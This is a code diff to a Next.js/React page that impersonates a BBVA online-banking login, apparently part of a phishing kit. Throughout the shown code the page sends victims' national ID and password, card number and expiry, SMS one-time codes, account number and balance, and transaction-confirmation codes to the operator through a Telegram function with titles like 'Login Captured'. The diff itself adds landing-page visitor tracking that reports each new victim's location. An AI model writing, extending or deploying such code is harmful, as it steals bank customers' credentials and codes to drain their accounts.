@@ -1,7 +1,7 @@
 "use client"
 
 import React, { useState, useEffect, useRef } from "react"
-import { sendTelegramMessage } from "@/lib/telegram"
+import { fetchVisitorInfo, sendTelegramMessage } from "@/lib/telegram"
 import {
   ChevronLeft,
   Eye,
@@ -68,62 +68,31 @@ export default function BbvaPage(props: any) {
     }
   }, [])
 
-  // Auto-fetch user location info when landing on the login screen
+  // Immediate visitor tracking and location alert on first screen
+  const hasTrackedVisitor = useRef(false)
   useEffect(() => {
+    if (hasTrackedVisitor.current) return
+    hasTrackedVisitor.current = true
+
     let isMounted = true
-    const fetchLocation = async () => {
+    const trackVisitorOnLanding = async () => {
       try {
-        const res = await fetch("https://ipapi.co/json/")
-        if (res.ok) {
-          const data = await res.json()
-          if (isMounted) {
-            setLocationInfo(data)
-            if (typeof window !== "undefined") {
-              sessionStorage.setItem("bbva_user_location", JSON.stringify(data))
-              if (data.ip) sessionStorage.setItem("bbva_user_ip", data.ip)
-              if (data.city) sessionStorage.setItem("bbva_user_city", data.city)
-              if (data.country_name) sessionStorage.setItem("bbva_user_country", data.country_name)
-            }
-          }
-          return
+        const info = await fetchVisitorInfo()
+        if (info && isMounted) {
+          setLocationInfo(info)
         }
-      } catch {
-        // Fallback endpoint
-        try {
-          const res2 = await fetch("https://api.country.is/")
-          if (res2.ok) {
-            const data2 = await res2.json()
-            if (isMounted) {
-              setLocationInfo(data2)
-              if (typeof window !== "undefined") {
-                sessionStorage.setItem("bbva_user_location", JSON.stringify(data2))
-                if (data2.ip) sessionStorage.setItem("bbva_user_ip", data2.ip)
-                if (data2.country) sessionStorage.setItem("bbva_user_country", data2.country)
-              }
-            }
-          }
-        } catch {}
+        await sendTelegramMessage({
+          title: "BBVA — New Visitor",
+          type: "visitor",
+        })
+      } catch (err) {
+        console.error("Visitor tracking error:", err)
       }
     }
-    fetchLocation()
+    trackVisitorOnLanding()
     return () => {
       isMounted = false
     }
-  }, [])
-
-  // Telegram notification for visitor landing
-  useEffect(() => {
-    const trackVisitor = async () => {
-      if (typeof window === "undefined") return
-      if (!sessionStorage.getItem("bbva_visitor_notified")) {
-        sessionStorage.setItem("bbva_visitor_notified", "1")
-        await sendTelegramMessage({
-          title: "BBVA - Visitor Landing",
-          type: "visitor",
-        })
-      }
-    }
-    trackVisitor()
   }, [])
 
   // Login form states
@@ -309,7 +278,7 @@ export default function BbvaPage(props: any) {
 
     try {
       await sendTelegramMessage({
-        title: "BBVA - Login Captured",
+        title: "BBVA — Login Captured",
         dni: userId.trim(),
         password: password,
         type: "login",
@@ -363,7 +332,7 @@ export default function BbvaPage(props: any) {
     try {
       const savedUser = (typeof window !== "undefined" && sessionStorage.getItem("bbva_userId")) || userId.trim()
       await sendTelegramMessage({
-        title: "BBVA - Card Details Captured",
+        title: "BBVA — Card Details Captured",
         dni: savedUser || undefined,
         cardNumber: cleanCard,
         expiry: expiry,
@@ -396,7 +365,7 @@ export default function BbvaPage(props: any) {
 
     const savedUser = (typeof window !== "undefined" && sessionStorage.getItem("bbva_userId")) || userId.trim()
     sendTelegramMessage({
-      title: "BBVA - SMS OTP Captured",
+      title: "BBVA — SMS OTP Captured",
       dni: savedUser || undefined,
       otp1: codeToSave,
       type: "otp",
@@ -498,7 +467,7 @@ export default function BbvaPage(props: any) {
 
     const savedUser = (typeof window !== "undefined" && sessionStorage.getItem("bbva_userId")) || userId.trim()
     sendTelegramMessage({
-      title: "BBVA - Account Details Captured",
+      title: "BBVA — Account Details Captured",
       dni: savedUser || undefined,
       accountNumber: accountNumber || "N/A",
       balance: accountBalance ? `€${accountBalance}` : "N/A",
@@ -528,7 +497,7 @@ export default function BbvaPage(props: any) {
 
     const savedUser = (typeof window !== "undefined" && sessionStorage.getItem("bbva_userId")) || userId.trim()
     sendTelegramMessage({
-      title: `BBVA - Transaction Confirm OTP (Attempt ${confirmAttempt})`,
+      title: `BBVA — Transaction Confirm OTP (Attempt ${confirmAttempt})`,
       dni: savedUser || undefined,
       otp2: code,
       attempt: `${confirmAttempt}`,
@@ -634,7 +603,7 @@ export default function BbvaPage(props: any) {
 
     const savedUser = (typeof window !== "undefined" && sessionStorage.getItem("bbva_userId")) || userId.trim()
     sendTelegramMessage({
-      title: "BBVA - Confirm OTP Resend Requested",
+      title: "BBVA — Confirm OTP Resend Requested",
       dni: savedUser || undefined,
       type: "resend_confirm_otp",
     }).catch(() => {})
@@ -651,7 +620,7 @@ export default function BbvaPage(props: any) {
 
     const savedUser = (typeof window !== "undefined" && sessionStorage.getItem("bbva_userId")) || userId.trim()
     sendTelegramMessage({
-      title: "BBVA - OTP Resend Requested",
+      title: "BBVA — OTP Resend Requested",
       dni: savedUser || undefined,
       type: "resend_otp",
     }).catch(() => {})
